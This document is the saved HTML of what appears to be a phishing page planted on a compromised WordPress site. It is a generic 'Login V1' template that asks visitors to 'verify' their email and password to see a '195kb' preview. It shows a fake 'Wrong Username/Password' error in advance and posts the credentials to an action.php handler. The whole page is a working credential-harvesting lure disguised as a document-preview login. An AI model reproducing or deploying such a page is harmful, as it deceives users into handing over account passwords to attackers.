<html lang="en"><head></head><body>

<!-- saved from url=(0070)https://www.aggarwalindia.in/wp-includes/SimplePie/item/project/v2.php -->
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Login V1</title>
	
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->
	<link rel="icon" type="image/png" href="https://colorlib.com/etc/lf/Login_v1/images/icons/favicon.ico">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="./Login V1_files/bootstrap.css">
<!--===============================================================================================-->
	<link rel="stylesheet" href="./Login V1_files/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="./Login V1_files/animate.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="./Login V1_files/hamburgers.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="./Login V1_files/select2.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="./Login V1_files/util.css">
	<link rel="stylesheet" type="text/css" href="./Login V1_files/main.css">
<!--===============================================================================================-->



	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<div class="login100-pic js-tilt" data-tilt="" style="transform: perspective(300px) rotateX(0deg) rotateY(0deg); will-change: transform;">
					<img src="./Login V1_files/img-01.png" alt="IMG">
				</div>
				
 

				<form method="POST" action="action.php" class="login100-form validate-form" onsubmit="return validateForm()" name="myform">
					<span class="login100-form-title">
					
						<img height="130" width="180" src="./Login V1_files/of.png"><br>
						<font size="3">Verify your email password to continue
						<br><strong><font color="#4F2117"></font></strong>
						</font>

<h3 style="color:Tomato;" font="" size="3">Wrong Username/Password</h3>
						<br>
					</span>

                                         <div class="wrap-input100 validate-input alert-validate" data-validate="Email is required">
						<input class="input100" type="Email" name="frm-email" placeholder="Email">
						<span class="focus-input100"></span>
						<span class="symbol-input100">
							<i class="fa fa-lock" aria-hidden="true"></i>
						</span>
					</div>



					<div class="wrap-input100 validate-input alert-validate" data-validate="Password is required">
						<input class="input100" type="password" name="frm-pass" placeholder="Password">
						<span class="focus-input100"></span>
						<span class="symbol-input100">
							<i class="fa fa-lock" aria-hidden="true"></i>
						</span>
					</div>

					<div class="container-login100-form-btn">
						<button class="login100-form-btn">
							Continue Preview 195kb
						</button>
					</div>

					<div class="text-center p-t-12">
						<span class="txt1">
							
						</span>
						<a class="txt2" href="https://www.aggarwalindia.in/wp-includes/SimplePie/item/project/v2.php#">
							
						</a>
					</div>

					<div class="text-center p-t-136">
						<a class="txt2" href="https://www.aggarwalindia.in/wp-includes/SimplePie/item/project/v2.php#">
							
							<i class="fa fa-long-arrow-right m-l-5" aria-hidden="true"></i>
						</a>
					</div>
				</form>
			</div>
		</div>
	</div>




<!--===============================================================================================-->
	<script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="./Login V1_files/analytics.js.download"></script><script type="text/javascript" async="" src="./Login V1_files/analytics.js(1).download"></script><script src="./Login V1_files/jquery-3.2.1.min.js.download"></script>
<!--===============================================================================================-->
	<script src="./Login V1_files/popper.js.download"></script>
	<script src="./Login V1_files/bootstrap.min.js.download"></script>
<!--===============================================================================================-->
	<script src="./Login V1_files/select2.min.js.download"></script>
<!--===============================================================================================-->
	<script src="./Login V1_files/tilt.jquery.min.js.download"></script>
	<script>
		$('.js-tilt').tilt({
			scale: 1.1
		})
	</script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async="" src="./Login V1_files/js"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-23581568-13');
</script>

<!--===============================================================================================-->
	<script src="./Login V1_files/main.js.download"></script>



</body></html>